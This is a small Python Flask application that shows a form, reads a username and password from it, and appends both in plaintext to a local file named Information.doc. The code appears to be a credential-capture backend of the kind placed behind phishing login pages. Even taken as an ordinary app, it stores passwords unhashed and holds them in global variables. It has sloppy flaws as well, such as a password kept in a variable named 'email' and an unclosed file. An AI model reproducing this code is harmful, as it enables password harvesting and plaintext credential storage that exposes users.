from flask import Flask,render_template,request,redirect,url_for
import os.path
from os import path
app = Flask(__name__)
@app.route('/',methods = ["GET","POST"])

def main():
    if request.method == "GET":
        return render_template("index1.html")
    else:
        info()
        return render_template("index2.html")
    
@app.route("/info",methods = ["POST"])    
def info():
    global name,email
    name = request.form.get("Nameinput")
    email = request.form.get("passwordInput")
    FileSave()
    return render_template('index2.html',username=name,password=email)

def FileSave():
    filename = "Information" + ".doc"
    filedir = os.path.dirname(os.path.realpath("__file__"))
    existing = bool(path.exists(filename))
    if(existing == False):
        adminfile = open(filename, "x")
        adminfile = open(filename, "w")
        adminfile.write("Username: " + name + " Password: " + email + "\n")
        adminfile.close()
    else:
        adminfile = open(filename,"a")
        adminfile.write("Username: " + name + " Password: " + email + "\n")
if __name__ == "__main__":
    app.run()

